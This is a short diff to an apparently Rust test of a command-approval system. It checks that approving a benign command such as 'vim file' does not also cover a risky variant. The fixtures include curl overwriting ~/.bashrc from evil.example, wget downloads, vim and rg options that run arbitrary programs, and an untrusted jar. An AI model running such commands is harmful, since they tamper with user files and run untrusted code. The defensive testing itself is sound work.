@@ -274,7 +274,7 @@ fn an_approval_reaches_no_further_than_the_line_it_was_given_for() {
             "curl -o /users/dev/.bashrc http://evil.example",
         ),
         ("wget http://x.example", "wget -O x http://evil.example"),
-        ("vim file", "vim -c !evil"),
+        ("vim file", "vim -c ':!evil'"),
         ("java Main", "java -jar evil.jar"),
         // Found by the independent review of the fixes to step 12.
         ("rg foo", "rg --pre=evil foo"),
